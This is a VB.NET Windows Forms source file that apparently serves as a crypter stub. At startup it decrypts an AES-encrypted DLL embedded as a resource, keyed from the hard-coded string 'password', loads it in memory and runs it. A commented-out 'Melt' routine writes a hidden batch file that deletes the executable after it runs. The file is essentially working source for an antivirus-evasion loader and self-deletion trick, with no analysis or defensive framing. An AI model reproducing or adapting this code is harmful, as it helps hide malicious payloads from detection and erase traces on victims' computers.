
Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Stuff.EnsureInitialized()
        Test()
    End Sub

    Sub Test()
        Dim Tdll As New dll.Class1
        Tdll.Main(Application.ExecutablePath)
    End Sub
    'Private Function getmyname(ByVal path As String) As String
    '    If path.IndexOf("\"c) = -1 Then Return String.Empty
    '    Return path.Substring(path.LastIndexOf("\"c) + 1)
    'End Function

    'Sub Melt()
    '    FileIO.FileSystem.WriteAllText(Application.StartupPath & "\d.bat", "timeout /t 1 >nul" & vbNewLine & "del " & getmyname(Application.ExecutablePath) & ">nul" & vbNewLine & "del d.bat >nul", False)

    '    Dim Strtinfo As New ProcessStartInfo
    '    Strtinfo.Arguments = ""
    '    Strtinfo.CreateNoWindow = True
    '    Strtinfo.FileName = Application.StartupPath & "\d.bat"
    '    Strtinfo.ErrorDialog = False
    '    Strtinfo.UseShellExecute = False
    '    Process.Start(Strtinfo)
    '    End
    'End Sub

End Class


Class Stuff
    Public Shared _initialized As Boolean
    Shared Sub EnsureInitialized()
        If Not _initialized Then
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf RetrieveEmbeddedAssembly
            _initialized = True
        End If
    End Sub
    Private Shared Function AES_Decrypt(ByVal input() As Byte) As Byte()
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = Security.Cryptography.CipherMode.ECB
            Dim DESDecrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateDecryptor
            Dim decrypted() As Byte = DESDecrypter.TransformFinalBlock(input, 0, input.Length)
            Return decrypted
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
        Dim resourceName As String = "Image." + New Reflection.AssemblyName(args.Name).Name + ".dll"
        'resourceName = "dll.dll"
        Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)

            Dim assemblyData = New Byte(stream.Length - 1) {}
            'decode assembly here

            stream.Read(assemblyData, 0, assemblyData.Length)
            assemblyData = AES_Decrypt(assemblyData)
            Return Reflection.Assembly.Load(assemblyData)

        End Using ' stream
    End Function

    Private Function ToBytes(ByVal instance As IO.Stream) As Byte()
        Dim capacity As Integer = If(instance.CanSeek, Convert.ToInt32(instance.Length), 0)
        Using result As New IO.MemoryStream(capacity)
            Dim readLength As Integer
            Dim buffer(4096) As Byte
            Do
                readLength = instance.Read(buffer, 0, buffer.Length)
                result.Write(buffer, 0, readLength)
            Loop While readLength > 0
            Return result.ToArray()
        End Using
    End Function

End Class